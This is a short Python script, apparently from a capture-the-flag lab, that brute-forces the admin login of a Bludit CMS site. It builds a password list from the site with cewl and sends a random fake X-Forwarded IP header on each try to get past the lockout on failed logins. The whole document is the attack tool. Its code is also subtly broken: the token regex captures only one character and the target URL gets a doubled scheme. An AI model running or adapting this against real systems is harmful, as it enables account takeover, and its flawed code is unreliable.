import subprocess
import requests
import random
import re

HOST = 'http://10.10.10.191/admin'
USER = 'fergus'
parser = re.compile(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([0-9a-z])"')

def init_session():
    r = requests.get(HOST)
    csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([0-9a-z])"', r.text).group(1)
    cookie = r.cookies.get("BLUDIT-KEY")
    return csrf, cookie

def login(user, password):
    r = requests.get(HOST)
    csrf, cookie = re.search(parser, r.text).group(1), r.cookies.get("BLUDIT-KEY")
    r.close()
    headers = {'X-Forwarded': f"{random.randint(1, 256)}.{random.randint(1, 256)}.{random.randint(1, 256)}.{random.randint(1, 256)}"}
    data = {'tokenCSRF': csrf, 'username': user, 'password': password, 'save': ''}
    cookie = {'BLUDIT-KEY': cookie}
    r = requests.post(HOST + '/login', data=data, cookies=cookie, headers=headers, allow_redirects=False) # Because have the header with x-forwar so no need proxy
    # r = requests.post(HOST + '/login', data=data, cookies=cookie, headers=headers, allow_redirects=False, proxies=PROXY)
    if r.status_code != 200:
        print('CSRF Error!')
        return True
    elif "password incorrect" in r.text:
        return False
    elif "has been blocked" in r.text:
        return False
    else:
        exit(f"{user}:{password}")
if __name__=="__main__":
    wordlist = subprocess.check_output(['cewl', f'http://{HOST}/'])
    if "Couldn't hit the site" in str(wordlist):
        exit(str(wordlist).split(r'\n')[1])
    wordlist = str(wordlist).replace('\r', '').split('\n')
    for passwd in wordlist:
        passwd = passwd.strip()
        login(USER, passwd)
